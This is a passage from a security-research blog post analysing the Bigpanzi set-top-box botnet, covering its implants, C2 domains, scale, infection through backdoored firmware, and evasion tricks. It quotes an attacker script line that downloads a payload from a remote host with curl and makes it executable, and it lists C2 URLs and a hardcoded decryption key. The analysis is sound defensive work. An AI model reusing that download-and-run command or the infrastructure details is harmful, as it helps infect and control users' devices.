<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <title>Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=256e1729b4" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=256e1729b4" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=256e1729b4" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css">

    <style>
        .gh-sidebar{
            width: 300px;
            left: -40px;
        }
        .gh-content ol ol li{
            list-style-type: none;
        }
        .gh-content {
            position: relative;
        }

        .gh-toc > .toc-list {
            position: relative;
            font-size: 12px;
             
        }

        .toc-list {
            overflow: hidden;
            list-style: none;
        }

        @media (min-width: 1300px) {
            .gh-sidebar {
                position: absolute; 
                top: 0;
                bottom: 0;
                margin-top: 4vmin;
                grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
            }
        
            .gh-toc {
                position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
                top: 4vmin;
            }
        }

        .gh-toc .is-active-link::before {
            background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
        } 
    </style>

    <link rel="icon" href="https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png" type="image/png">
    <link rel="canonical" href="https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="奇安信 X 实验室">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box">
    <meta property="og:description" content="Background


Some time ago, we intercepted a dubious ELF sample exhibiting zero detection on VirusTotal. This sample, named pandoraspear and employing a modified UPX shell, has an MD5 signature of 9a1a6d484297a4e5d6249253f216ed69. Our analysis revealed that it hardcoded nine C2 domain names, two of which had lapsed beyond their expiration protection">
    <meta property="og:url" content="https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/">
    <meta property="og:image" content="https://blog.xlab.qianxin.com/content/images/2024/01/bigpan_head.png">
    <meta property="article:published_time" content="2024-01-15T14:08:27.000Z">
    <meta property="article:modified_time" content="2024-06-06T01:51:23.000Z">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="Android">
    <meta property="article:tag" content="eCos">
    <meta property="article:tag" content="STB">
    <meta property="article:tag" content="DVB">
    <meta property="article:tag" content="EN">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box">
    <meta name="twitter:description" content="Background


Some time ago, we intercepted a dubious ELF sample exhibiting zero detection on VirusTotal. This sample, named pandoraspear and employing a modified UPX shell, has an MD5 signature of 9a1a6d484297a4e5d6249253f216ed69. Our analysis revealed that it hardcoded nine C2 domain names, two of which had lapsed beyond their expiration protection">
    <meta name="twitter:url" content="https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/">
    <meta name="twitter:image" content="https://blog.xlab.qianxin.com/content/images/2024/01/bigpan_head.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Botnet, DDoS, Android, eCos, STB, DVB, EN">
    <meta name="twitter:site" content="@Xlab_qax">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="857">
    <meta property="og:image:height" content="492">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "奇安信 X 实验室",
        "url": "https://blog.xlab.qianxin.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/2023/08/turing.png",
            "width": 1363,
            "height": 1363
        },
        "url": "https://blog.xlab.qianxin.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box",
    "url": "https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/",
    "datePublished": "2024-01-15T14:08:27.000Z",
    "dateModified": "2024-06-06T01:51:23.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.xlab.qianxin.com/content/images/2024/01/bigpan_head.png",
        "width": 857,
        "height": 492
    },
    "keywords": "Botnet, DDoS, Android, eCos, STB, DVB, EN",
    "description": "Background\n\n\nSome time ago, we intercepted a dubious ELF sample exhibiting zero detection on VirusTotal. This sample, named pandoraspear and employing a modified UPX shell, has an MD5 signature of 9a1a6d484297a4e5d6249253f216ed69. Our analysis revealed that it hardcoded nine C2 domain names, two of which had lapsed beyond their expiration protection period. We seized this opportunity to register these domains to gauge the botnet&#x27;s scale. At its peak, we noted approximately 170,000 daily active b",
    "mainEntityOfPage": "https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/"
}
    </script>

    <meta name="generator" content="Ghost 5.70">
    <link rel="alternate" type="application/rss+xml" title="奇安信 X 实验室" href="https://blog.xlab.qianxin.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="85bfb974adb4cf4f0cda2658c7" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.xlab.qianxin.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.xlab.qianxin.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=256e1729b4"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=256e1729b4">
    <script defer src="/public/comment-counts.min.js?v=256e1729b4" data-ghost-comments-counts-api="https://blog.xlab.qianxin.com/members/api/comments/counts/"></script>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-8T4S62VBFD"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-8T4S62VBFD');
</script>
<style>:root {--ghost-accent-color: #4ca2ba;}</style>

</head>
<body class="post-template tag-botnet tag-ddos tag-android tag-ecos tag-stb tag-dvb tag-en is-head-middle-logo has-serif-title has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://blog.xlab.qianxin.com">
                        奇安信 X 实验室
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://blog.xlab.qianxin.com/">Home</a></li>
    <li class="nav-about"><a href="https://blog.xlab.qianxin.com/about/">About</a></li>
    <li class="nav-en"><a href="https://blog.xlab.qianxin.com/tag/en/">EN</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-botnet tag-ddos tag-android tag-ecos tag-stb tag-dvb tag-en ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/botnet/">Botnet</a>
                </span>
        </div>

        <h1 class="article-title">Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/alex/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/08/turing.png" alt="Alex.Turing" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/acey9/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/11/3346712.jpeg" alt="Acey9" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/rootkiter/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2024/01/Xnip2023-07-24_17-04-40.jpg" alt="rootkiter" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/acey9/">Acey9</a>, <a href="/author/rootkiter/">rootkiter</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2024-01-15">2024年1月15日</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 33 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    src="/content/images/size/w2000/2024/01/bigpan_head.png"
                    alt="Bigpanzi Exposed: The Hidden Cyber Threat Behind Your Set-Top Box"
                />
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <aside class="gh-sidebar"><div class="gh-toc"></div></aside> 
        <p></p><h1 id="background">Background<br></h1><p>Some time ago, we intercepted a dubious ELF sample exhibiting zero detection on VirusTotal. This sample, named <strong>pandoraspear</strong> and employing a modified UPX shell, has an MD5 signature of 9a1a6d484297a4e5d6249253f216ed69. Our analysis revealed that it hardcoded nine C2 domain names, two of which had lapsed beyond their expiration protection period. We seized this opportunity to register these domains to gauge the botnet's scale. At its peak, we noted approximately <strong>170,000 daily active bots, predominantly in Brazil.</strong></p><p>Upon realizing that we had secured their domains, the group countered aggressively. They <strong>bombarded our domains with DDoS attacks </strong>to force them offline and manipulated the hosts files of the infected devices. This strategy redirects certain domain names to specific IP addresses, bypassing the normal DNS resolution process used to find the IP addresses of <strong>Command and Control </strong>domains. This greatly limits our ability to observe and track them.</p><p>We finished analyzing the sample fast and started monitoring the botnet's attack instructions. This led us to various download scripts, such as <strong>a.sh, pd.sh</strong>, and <strong>cpcdn.sh</strong>. These scripts either directly provided additional implants for the syndicate, like pcdn, ptcrack, and p2p_peer, or indirectly expanded our insight. Notably, a discernible pattern in the Downloader URLs within these scripts led us to 22 such URLs. These were hard-coded into a set of APKs used for deploying pandoraspear/pcdn-containing <strong>Android platform</strong> firmware upgrades. Moreover, the implants unraveled further connections. For instance, specific strings in pcdn pointed us to two <strong>Windows platform</strong> DDoS tools linked to the group. These tools further led us to 32 <strong>eCos platform</strong> firmwares embedding five domains, which shared the same IP for C2 resolutions as pcdn.</p><p>As our investigation and source tracing deepened, a major cybercrime syndicate, active since 2015, gradually surfaced. This syndicate primarily targets Android OS TVs and set-top boxes, as well as eCos OS set-top boxes. Differing from typical botnets spreading through 0/N day vulnerabilities, this group's modus operandi involves enticing users to install free or cheap audio-visual apps or firmware updates, embedding backdoor components. Once installed, these devices transform into operational nodes within their illicit streaming media platform, catering to services like traffic proxying, DDoS attacks, OTT content provision, and pirate traffic. Considering the botnet's enormous scale and the filename pandoraspear, we dubbed the cybercime syndicate <strong>Bigpanzi</strong>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_bigbasic.png" class="kg-image" alt="pan_bigbasic.png" loading="lazy"></figure><p>Since we started tracking their commands, we've been quietly collecting evidence and steadily working to trace Bigpanzi's origins, with the ultimate goal of delivering a decisive strike against them.In May 2023, <a href="https://news.drweb.com/show/?i=14743&ref=blog.xlab.qianxin.com">Dr.WEB</a> spotlighted pandoraspear, and on September 6, they shared their discoveries with the community, enriching our understanding of pandoraspear's spread through pirated traffic APKs.</p>
<p>Bigpanzi's menace extends beyond the infamous DDoS attacks. It can misuse controlled Android TVs and set-top boxes to disseminate any form of visual or audio content, unbound by legal constraints. This mode of attack has manifested in real-world incidents, like a <a href="https://www.khaleejtimes.com/uae/uae-cyberattack-disrupts-tv-services-rattles-some-residents-with-graphic-content-from-gaza?ref=blog.xlab.qianxin.com">network attack on set-top boxes in the UAE</a> on December 11, 2023, where <strong>regular broadcasts were substituted with footage of the Israel-Palestine conflict</strong>. The potential for Bigpanzi-controlled TVs and STBs to broadcast violent, terroristic, or pornographic content, or to employ increasingly convincing AI-generated videos for political propaganda, poses a significant threat to social order and stability.</p>
<p>With these factors in mind, we decided to document our findings in this article, sharing our discoveries with the community in hopes of collaboratively dismantling this cybercrime syndicate that has been in hiding for <strong>eight years</strong>.</p><h1 id="the-identity-of-bigpanzi">The Identity of Bigpanzi<br></h1><p>Within the Pcdn sample, we identified a downloader domain: ak.tknxg.cf. Through Google searches, we unearthed two pivotal leads. One provided instructions for device upgrades, and the other offered guidance on device repairs. Particularly striking was the YouTube channel at [<a href="https://www.youtube.com/@customersupportteam49?ref=blog.xlab.qianxin.com">https://www.youtube.com/@customersupportteam49</a>], teeming with device operation-related videos, all conveying a pronounced “official” vibe.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_googclues.png" class="kg-image" alt="pcdn_googclues.png" loading="lazy"></figure><p>On the official website of a Spanish manufacturer <strong>FoneStar</strong>, specifically on the product page for the <a href="https://fonestar.com/en/rds-585whd?ref=blog.xlab.qianxin.com">RDS-585WHD</a>, we located an eCos system firmware, b0a192c6f2bbd7247dfef36665bf6c88.</p>
<p></p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_fonestar_firmware.png" class="kg-image" alt="pan_fonestar_firmware.png" loading="lazy"></figure><p><br>This firmware shared identical DDoS task names and method names with Pcdn, marking it as an “official firmware embedded with malware.” (Note: This doesn’t directly implicate FoneStar as Bigpanzi!)</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_conditionB.png" class="kg-image" alt="pan_conditionB.png" loading="lazy"></figure><p>The uncovering of this “official video account” and “official malware-infused firmware” led us to speculate about the real identity of Bigpanzi. Our tracing efforts have indeed been fruitful, revealing significant evidence pointing towards a company. However, we choose not to divulge the details here. If you're curious about the full story, <strong>feel free to contact us for more details</strong> !</p><h1 id="scale">Scale<br></h1><p>We successfully hijacked two C2 domains of pandoraspear: <strong>mf1ve.com</strong> and <strong>ftsym1.com</strong>. During a seven-day observation period, the peak daily active bots were around 170,000, primarily in Brazil. Unfortunately, the authors countered by modifying Hosts and launching DDoS attacks. We didn’t engage much in this confrontation, voluntarily ceased resolving, and consequently lost this perspective. On August 15, 2023, we reactivated the resolution for mf1ve.com and observed a peak daily bot activity of 77,849, with the count on October 13 being 27,446.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_cnt.png" class="kg-image" alt="pando_cnt.png" loading="lazy"></figure><p>In September 2023, we hijacked the downloader domain <strong>dyanoe.com</strong> from pcdn, observing a peak daily bot activity of 80,816 on October 13.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_cnt.png" class="kg-image" alt="pando_cnt.png" loading="lazy"></figure><p>What’s the relationship between pandoraspear and pcdn? Early download scripts like a.sh or na.sh contained segments where pd.sh downloads updates for pandoraspear and cpcdn.sh for pcdn, appearing in pairs on compromised devices.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_a.png" class="kg-image" alt="pan_a.png" loading="lazy"></figure><p>However, in the current primary download script naa.sh, pandoraspear appears alone, with pcdn-related code being commented out. Thus, data observed through dyanoe.com can be considered as residual data. The sum of data from both mf1ve.com and dyanoe.com likely represents the true scale.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_naa.png" class="kg-image" alt="pan_naa.png" loading="lazy"></figure><p>After deduplicating the data, the peak daily active bots on October 13 were 107,819. Adding up the data from both domains on the same date, 27,446 + 80,816 = 108,262, which is only 443 more than 107,819. The overlap is minimal, confirming that the botnet's scale exceeds 100,000.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_total.png" class="kg-image" alt="pan_total.png" loading="lazy"></figure><p>The botnet nodes are predominantly distributed across Brazil, amassing over 1.3 million distinct IPs since August.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/bigpan_worldmap.png" class="kg-image" alt="bigpan_worldmap.png" loading="lazy"></figure><p>The distribution of bot nodes in Brazil is primarily in São Paulo.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_statbrazil.png" class="kg-image" alt="pan_statbrazil.png" loading="lazy"></figure><h1 id="governance">Governance<br></h1><p>A botnet of 100,000 is quite substantial, but we believe the actual size may be larger due to two factors:</p><ul><li>Observational Limitations: The hijacked C2 and downloader domains are just one of many options for pandoraspear/pcdn, leading to potential omissions.</li><li>Device Specificity: TVs or STBs as compromised devices might not be powered on 24/7, also leading to data omissions.</li></ul><p>Some may wonder if there's a way to measure the true daily active scale of pandoraspear. The answer is yes! Pandoraspear updates the device's hosts through the following URLs, theoretically allowing Amazon to track all visiting IPs.</p><pre><code>pandoramain-1794008345.us-west-2.elb.amazonaws.com:8080/marketdatas/dns/hosts
pandorabackup-1322908155.us-west-2.elb.amazonaws.com:8080/marketdatas/dns/hosts</code></pre><p>Is it possible to govern such a large-scale botnet? Again, the answer is affirmative!</p><ol><li><strong>Solution 1</strong>: We control two of pandoraspear's nine C2s. By responding according to the network protocol, we can take over part of the network.</li><li><strong>Solution 2</strong>: Pcdn executes payloads from the downloader using the system command without verification. We can issue scripts via the downloader to modify hosts, thereby taking control of part of the network.</li><li><strong>Solution 3</strong>: Amazon could take over the domains used by pandoraspear to host hosts files. By distributing new hosts files to hijack C2s, they could take control of the entire network.</li></ol><h1 id="infection">Infection<br></h1><p>How does such a large-scale botnet infect devices? Currently, we know that Bigpanzi targets Android and eCos platforms, employing the following three methods to infect user devices:</p><ol><li>Pirated movie &amp; TV apps (Android)</li><li>Backdoored generic OTA firmware (Android)</li><li>Backdoored "SmartUpTool" firmware (eCos)</li></ol><h2 id="android-app-infection"><strong>Android: APP Infection<br></strong></h2><p>Dr.Web has already conducted a detailed analysis of this method in their blog, which interested readers can refer to for more information.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_drweb.png" class="kg-image" alt="pan_drweb.png" loading="lazy"></figure><h2 id="android-backdoored-ota-firmware-infection"><strong>Android: Backdoored OTA Firmware Infection<br></strong></h2><p>The second method involves backdoored generic OTA firmware. We discovered this while tracking commands for pandoraspear, receiving instructions to download and execute scripts containing the following code snippet. We identified 'stb-download/tool/' as a strong characteristic, leading us to potentially surprising findings when traced.</p><pre><code class="language-javascript">function dl_file() {
    cd /data/ &amp;&amp; rm -rf pdbak  &amp;&amp; curl "http://fadfatest.pneydn.com:8080/stb-download/tool/$1" -o pdbak &amp;&amp; chmod 755 pdbak  
}
</code></pre><p>Indeed, hunting with "/stb-download/" revealed 22 suspicious domains following a unified pattern: stb-download/s905{}/package_list.xml, distributed across 7 APKs belonging to 2 different packages.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_apkupdate.png" class="kg-image" alt="pan_apkupdate.png" loading="lazy"></figure><p>For instance, 606939075437b985bce0d46b080419d9 in swl.app.Upgrade.UpdateHttpClient's setUrl method shows the mentioned URL.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_swl.png" class="kg-image" alt="pando_swl.png" loading="lazy"></figure><p>These APKs mainly download and upgrade firmware based on different models. For example, xtsj.sisenji.com's package_list.xml combines the URL and NAME in Payload to form an OTA firmware download address.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_xmlinfo.png" class="kg-image" alt="pan_xmlinfo.png" loading="lazy"></figure><p>From this address, we downloaded a firmware with an MD5 of 8b42856160806089fc63a97b0f31841d. Upon extraction, we found familiar friends pandoraspear and pcdn in its /system/bin directory. From 18 URLs, we extracted 4 firmwares, spanning 2019 to 2023, all containing pandoraspear or pcdn, confirming Bigpanzi's development of backdoored OTA upgrade packages for device infection.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_dir.png" class="kg-image" alt="pando_dir.png" loading="lazy"></figure><p>The setUrl method also includes many model.equalsIgnoreCase("Ebox") codes for device model comparison. We identified 12 different device models targeted by Bigpanzi across 7 APKs:</p><table>
<thead>
<tr>
<th>Ebox</th>
<th>Obox</th>
<th>Hbox+</th>
</tr>
</thead>
<tbody>
<tr>
<td>Htv-6h</td>
<td>H6-INT</td>
<td>Luan2</td>
</tr>
<tr>
<td>A3</td>
<td>IceCream</td>
<td>Tigre 2</td>
</tr>
<tr>
<td>A3 Pro</td>
<td>H7</td>
<td>UniTV</td>
</tr>
</tbody>
</table>
<p>Additionally, we found backdoored firmware on forums like fonestero.com, such as a post by user <strong>EL_LARA</strong>, offering firmware named IRIS1800-4K_Pro_11.08.2023.zip with MD5 b77b797ac55e378f952ce120bab97b12.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_ellara.png" class="kg-image" alt="pan_ellara.png" loading="lazy"></figure><p>This firmware, a compressed package, contained core components of Bianpanzi like pandoraspear and pcdn.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_forum.png" class="kg-image" alt="pan_forum.png" loading="lazy"></figure><h2 id="ecos-backdoored-smartuptool-firmware-infection"><strong>eCos: Backdoored "SmartUpTool" Firmware Infection<br></strong></h2><p>During the trace of Pcdn, we found a DDoS Builder linked to this cybercrime syndicate, with one of its C2 domains being ruetsm.mkuspt.com. Numerous firmwares starting with SmartUpToolRomFile related to another subdomain, boxupsev.mkuspt.com, contained Pcdn's unique attack vector ddiy01task.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_smart.png" class="kg-image" alt="pan_smart.png" loading="lazy"></figure><p>For example, d71e54f42d6b45604cf29780256032d8, whose format we weren't familiar with, was forcibly extracted using binwalk.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_walk.png" class="kg-image" alt="pan_walk.png" loading="lazy"></figure><p>File<strong> A0038</strong> contained many strings related to Pcdn's DDoS functionality, and five domains resolved to the same IP as Pcdn's C2, suggesting <strong>a backdoored firmware with a module similar to Pcdn's DDoS function</strong>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_ecosddos.png" class="kg-image" alt="pan_ecosddos.png" loading="lazy"></figure><p>This firmware, named <strong><em>Nueva_EMU_103_RDS_585_WHD_24_09_2021_Emu_Limpia_sin_canales_con_el_logo_Fonestar</em></strong> on VT, was also found on the fonestero.com forum, posted by the same <strong>EL_LARA</strong>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_web.png" class="kg-image" alt="pan_web.png" loading="lazy"></figure><p>In conclusion, Bigpanzi spreads backdoored firmware through various STB, DVB, and IPTV forums to infect devices running Android or eCos systems.</p><h1 id="analysis-of-bigpanzi-samples">Analysis of Bigpanzi Samples<br></h1><p>The Bigpanzi group uses a wide range of sample types, including PE, DEX, and ELF formats. This analysis will begin with the ELF format pandoraspear, reverse engineering it to uncover the methods of infection, the devices targeted, the operational tactics, and ultimately to map out the expanse of this vast cybercrime network.</p><p>Before delving into the reverse engineering, let's first look at the countermeasures employed by Bigpanzi's samples at both the binary and runtime levels. These strategies have been crucial in keeping them hidden from security radars for an extended period and are deceptively simple yet highly effective.</p><h1 id="0x00-countermeasures">0x00: Countermeasures</h1>
<h2 id="modified-upx-shell">Modified UPX Shell</h2>
<p>The pandoraspear sample utilizes UPX for packing, but with a twist: the magic number is altered to 0x71284075. This particular magic number can be seen as a signature of the group, given its consistent use over time. To unpack, simply replace the magic number with 0x21585055 (UPX!) and then proceed with upd -d.<img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_upx.png" alt="pan_upx.png" loading="lazy"></p>
<h2 id="dynamic-linking">Dynamic Linking</h2>
<p>Pandoraspear relies on dynamic linking and the use of an external libcurl library. This dependency is a key factor in its prolonged low detection rate, as it often fails to run in standard sandbox environments. To execute or debug the sample, an appropriate version of libcurl.so is necessary. In our analysis, we used a libcurl library with the hash 49F65662C089C5E009FB76AF1971F9DA.   <img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_dyn.png" alt="pan_dyn.png" loading="lazy"></p>
<h2 id="ollvm-techniques">OLLVM Techniques</h2>
<p>Pandoraspear has been processed with OLLVM, applying control flow flattening and instruction substitution. The evolution from versions 8 to 10 shows minor functional changes but a significant increase in the number of flattened functions and passes. In IDA, this is evident as an increase in the number of blocks within a function. For example, a main function in v8 that initially had 168 blocks expanded to 1110 blocks post-flattening, and in v10, it ballooned to a staggering 1947 blocks.</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_ollvm.png" alt="pan_ollvm.png" loading="lazy"></p>
<p>For de-flattening, various methods and tools are already available in the community. We employed the "Dynamic Execution + LOG Recovery" approach, which is straightforward and effective. The optimal solution, however, is to find versions that weren't compiled with OLLVM. Luckily, in the early stages of our investigation, we discovered versions 1 and 2 without OLLVM, which greatly facilitated our initial reverse engineering process.</p>
<h2 id="anti-debugging-mechanism">Anti-Debugging Mechanism</h2>
<p>Pandoraspear employs an anti-debugging technique by reading the TracerPid from "/proc/{PID}/status" to determine if it's being debugged (non-zero value).</p>
<h1 id="0x01-pandoraspear-analysis">0x01: Pandoraspear Analysis<br></h1><p>Since 2015, pandoraspear has been continuously evolving, with the latest version being v10. We have captured eight different versions of this malware, including v1, v2, v4, v6, and up to v10. A cross-comparison of these versions reveals that their main execution logic remains consistent, with variations primarily in aspects such as shell packaging, usage of OLLVM for compilation, and the range of supported commands. Notably, the pandoraspearrk version stands out as being significantly larger than the others. This increase in size is not due to added functionality but rather because it embeds the curl library.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_version.png" class="kg-image" alt="pan_version.png" loading="lazy"></figure><p>In summary, pandoraspear is a backdoor trojan targeting Android systems, characterized by its straightforward and clear execution logic, which can be divided into three main steps:</p><ol><li><strong>DNS Hijacking</strong>: Initially, it requests an encrypted hosts file from a remote server. After decrypting this file, pandoraspear replaces the /etc/hosts file on the compromised device, thereby achieving DNS hijacking. This step is crucial for controlling the device's network traffic and redirecting it as needed.</li><li><strong>Establishing Communication with C2 Servers</strong>: The malware then establishes communication with a Command and Control (C2) server. This C2 can be specified via the command line, decrypted from /data/.ms, or be hardcoded within the malware itself. This step is vital for receiving updates, instructions, and transmitting data back to the attackers.</li><li><strong>Executing Commands from C2</strong>: Finally, pandoraspear awaits instructions from the C2 server, ready to execute various functions such as launching Distributed Denial of Service (DDoS) attacks, initiating a reverse shell, or executing other commands as directed. This functionality demonstrates the malware's capability to perform a range of malicious activities remotely controlled by the attackers.</li></ol><p>The following analysis will delve into the details of these three key steps, exploring how pandoraspear operates and the implications of its actions on infected Android systems. By understanding its methodology, we can gain insights into the malware's capabilities, objectives, and the threats it poses.</p><h2 id="11-hosts-hijacking">1.1 Hosts Hijacking<br></h2><p>Pandoraspear employs a method of DNS hijacking by modifying the /etc/hosts file. It starts by using libcurl to download an encrypted hosts file from a hardcoded URL in the malware sample. This file is then saved locally as /data/.hosts. Different versions of the malware contain slightly different hardcoded URLs. For detailed URLs, please refer to the IOC (Indicators of Compromise) section. The primary URL currently in use is <code>http://pandoramain-1794008345.us-west-2.elb.amazonaws.com:8080/marketdatas/dns/hosts</code>. The content of this downloaded file is encrypted.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_awshosts.png" class="kg-image" alt="pan_awshosts.png" loading="lazy"></figure><p>It's noteworthy that in the parent directory 'dns' of the URL used by pandoraspear, we discovered numerous backups of earlier hosts files, dating back to 2018. This finding indicates that the Bigpanzi group has been actively maintaining, updating, and expanding its operations over several years.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_hostsback.png" class="kg-image" alt="pan_hostsback.png" loading="lazy"></figure><p>The decryption process for the hosts file used by pandoraspear can be broken down into three steps, and a complete decryption script is provided in the appendix:</p><ol><li><strong>Code Table Replacement</strong>: This step involves replacing specific characters or sequences in the encrypted file according to a predetermined code table.</li><li><strong>Bit Shifting Calculation</strong>: This involves processing every six bytes of the encrypted data, shifting their bits to obtain four bytes of decrypted data.</li><li><strong>Blowfish ECB Decryption</strong>: The final step is to decrypt the data using the Blowfish algorithm in ECB (Electronic Codebook) mode. The key used for decryption is the hardcoded string 'zAw2xidjP3eHQ'.</li></ol><p>Taking the hosts file dated "07 Nov 2023 07:20:00" as an example, decryption using the script 